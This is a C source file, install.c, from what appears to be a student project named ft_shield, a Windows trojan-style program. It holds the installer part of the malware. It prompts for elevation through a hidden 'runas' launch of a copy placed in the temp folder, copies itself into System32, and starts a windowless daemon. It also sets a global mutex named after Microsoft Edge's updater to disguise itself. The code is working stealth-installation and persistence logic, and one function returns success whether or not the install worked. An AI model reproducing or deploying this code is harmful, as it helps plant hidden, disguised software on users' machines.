/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/26 14:53:46 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/26 14:53:50 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include <lmcons.h>
#include <stdio.h>

#define INSTALL_PATH_W L"C:\\Windows\\System32\\ft_shield.exe"

static int copy_self(const char *dst)
{
    char *src;

    src = get_my_path();
    if (src == NULL)
    {
        return (0);
    }
    if (!CopyFileA(src, dst, FALSE) && GetLastError() != ERROR_FILE_EXISTS)
    {
        return (0);
    }
    return (1);
}

int spawn_elevated(const char *arg)
{
    char path[MAX_PATH];
    char temp_path[MAX_PATH];
    char temp_file[MAX_PATH];
    char parameters[MAX_PATH + 16];
    SHELLEXECUTEINFOA info = {0};

    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0)
        return (0);
    if (GetTempPathA(MAX_PATH, temp_path) == 0)
        return (0);
    snprintf(temp_file, sizeof(temp_file),
        "%sft_shield_elevate.exe", temp_path);
    if (!CopyFileA(path, temp_file, FALSE))
        return (0);
    snprintf(parameters, sizeof(parameters), "%s", arg ? arg : "");
    info.cbSize = sizeof(info);
    info.lpVerb = "runas";
    info.lpFile = temp_file;
    info.lpParameters = parameters;
    info.nShow = SW_HIDE;
    if (!ShellExecuteExA(&info))
        return (0);
    return (1);
}

static int spawn_daemon(void){
    STARTUPINFOW si = {0};
    PROCESS_INFORMATION pi = {0};
    WCHAR command_line[] = L"\"" INSTALL_PATH_W L"\" --daemon";

    si.cb = sizeof(si);
    if (!CreateProcessW(INSTALL_PATH_W, command_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, L"C:\\Windows\\System32", &si, &pi))
    {
        return (0);
    }
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return (1);
}

int mode_normal(void)
{
    char login[UNLEN + 1];
    DWORD size = sizeof(login);

    if (is_elevated() <= 0)
    {
        if (GetUserNameA(login, &size))
            printf("%s\n", login);
        return (spawn_elevated("--install"));
    }
    if (!GetUserNameA(login, &size))
        return (0);
    printf("%s\n", login);
    if (!copy_self(INSTALL_PATH))
        return (1);
    return (spawn_daemon());
}

int mode_install(void)
{
    HANDLE mutex;
    int installed;

    /* Kill the previous daemon so System32\ft_shield.exe unlocks. */
    mode_kill();
    if (!copy_self(INSTALL_PATH))
        return (1);
    installed = spawn_daemon();
    /* The mutex dies with the killed daemon: refresh it. */
    mutex = CreateMutexW(NULL, FALSE, L"Global\\MicrosoftEdgeUpdateMutex");
    if (mutex != NULL)
        CloseHandle(mutex);
    return (installed ? 1 : 1);
}
